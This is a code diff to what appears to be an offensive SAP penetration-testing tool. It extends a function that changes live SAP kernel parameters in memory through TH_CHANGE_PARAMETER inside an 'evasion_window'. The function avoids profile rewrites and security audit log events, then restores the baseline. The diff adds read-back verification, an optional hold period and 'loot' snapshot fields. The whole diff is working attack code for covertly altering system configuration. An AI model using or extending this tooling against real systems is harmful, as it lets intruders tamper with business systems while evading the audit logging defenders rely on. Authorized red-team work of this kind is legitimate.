@@ -46,7 +46,25 @@ def _wrap_result(technique: str, ok: bool, **extra) -> dict:
     return out
 
 
+def _read_param_live(node, creds, name: str) -> str:
+    """Single TH_GET_PARAMETER read.  Returns the live runtime value
+    or "" on failure (the caller decides what an empty read means)."""
+    import sapmap_rfc
+    try:
+        with sapmap_rfc._get_connection(node, creds) as conn:
+            r = conn.call("TH_GET_PARAMETER", PARAMETER_NAME=name)
+            v = (r.get("PARAMETER_VALUE")
+                  or r.get("VALUE")
+                  or r.get("RETURN_VALUE") or "")
+            if isinstance(v, bytes):
+                v = v.decode("utf-8", errors="replace")
+            return str(v).strip()
+    except Exception:
+        return ""
+
+
 def tier3_set_param(state, node, param: str, value: str,
+                     hold_seconds: float = 0.0,
                      creds=None) -> dict:
     """4.A.2 / 4.C.4 — dynamic kernel-parameter set via TH_CHANGE_PARAMETER.
 
@@ -55,10 +73,21 @@ def tier3_set_param(state, node, param: str, value: str,
     window so the captured baseline value is automatically restored on
     exit (or on exception).
 
+    After the write, the runtime value is re-read via ``TH_GET_PARAMETER``
+    so the operator gets ground truth on whether the kernel actually
+    committed the change (some compound params and some kernels return
+    RC=0 from the writer even when the value was rejected silently).
+
+    When ``hold_seconds > 0`` the function sleeps before exiting the
+    evasion window so the operator can verify the mutated value in
+    RZ11 / SM50 during the hold.  Without a hold the window restores
+    the baseline within milliseconds and the live value will never
+    appear changed in RZ11.
+
     The change is in-memory only — no profile file rewrite, no kernel
-    restart, no AUM/AUW SAL events.  Survives until restore_baseline
-    is called by ``evasion_window.__exit__``.
+    restart, no AUM/AUW SAL events.
     """
+    import time as _time
     technique = "rz11_dynamic_set"
     try:
         assert_evasion_allowed(state, node, technique,
@@ -83,6 +112,8 @@ def tier3_set_param(state, node, param: str, value: str,
             applied=False)
 
     write_result = {"ok": False, "error": "not attempted"}
+    live_after_write = ""
+    live_after_restore = ""
     try:
         with evasion_window(node, state, technique,
                              creds=creds,
@@ -91,19 +122,64 @@ def tier3_set_param(state, node, param: str, value: str,
             if write_result["ok"]:
                 print(f"[+] {snap.sid}: TH_CHANGE_PARAMETER — "
                       f"{param}={value!r} (baseline {param}={original!r})")
+                # Verify-read so we know whether the kernel actually
+                # committed.  If the live value still equals the
+                # baseline, the writer call was a silent no-op (which
+                # is the symptom that triggered this whole investigation
+                # — some kernels accept the call with RC=0 but skip
+                # the commit on certain CHECK_PARAMETER values).
+                live_after_write = _read_param_live(node, creds, param)
+                if live_after_write == str(value):
+                    print(f"[+] {snap.sid}: verify-read — "
+                          f"{param}={live_after_write!r} (commit "
+                          f"confirmed)")
+                else:
+                    print(f"[!] {snap.sid}: verify-read — "
+                          f"{param}={live_after_write!r} (expected "
+                          f"{value!r}; writer call returned RC=0 but "
+                          f"the kernel did NOT commit the change — "
+                          f"the change is being silently rejected)")
+                if hold_seconds > 0:
+                    print(f"[*] {snap.sid}: holding {param}={value!r} "
+                          f"for {hold_seconds}s — check RZ11 now")
+                    _time.sleep(max(0.0, float(hold_seconds)))
             else:
                 print(f"[-] {snap.sid}: TH_CHANGE_PARAMETER failed — "
                       f"{param}={value!r}: {write_result['error']}")
+        # evasion_window has exited at this point — restore should
+        # have fired.  Verify again so we see whether the kernel really
+        # rolled back to baseline.
+        if write_result["ok"]:
+            live_after_restore = _read_param_live(node, creds, param)
+            if live_after_restore == str(original):
+                print(f"[+] {snap.sid}: post-restore verify — "
+                      f"{param}={live_after_restore!r} (baseline)")
+            else:
+                print(f"[!] {snap.sid}: post-restore verify — "
+                      f"{param}={live_after_restore!r} (expected "
+                      f"baseline {original!r}; restore did NOT commit "
+                      f"— operator must manually reset via RZ11)")
     except EvasionGateError as e:
         return _wrap_result(technique, False, error=str(e),
                              applied=False)
 
+    # Surface verify-read results so the GUI can flag a silent-no-op.
+    applied = (write_result["ok"]
+                and (live_after_write == str(value)
+                     or live_after_write == ""))
+    err = write_result["error"] if not write_result["ok"] else ""
+    if (write_result["ok"] and live_after_write
+            and live_after_write != str(value)):
+        err = (f"writer returned RC=0 but verify-read shows "
+                f"{param}={live_after_write!r}, not {value!r}")
     return _wrap_result(
         technique, write_result["ok"],
         param=param, requested_value=value,
         baseline_value=original,
-        applied=write_result["ok"],
-        error=write_result["error"] if not write_result["ok"] else "",
+        live_after_write=live_after_write,
+        live_after_restore=live_after_restore,
+        applied=applied,
+        error=err,
         snapshot_loot=snap.loot_path)
 
 
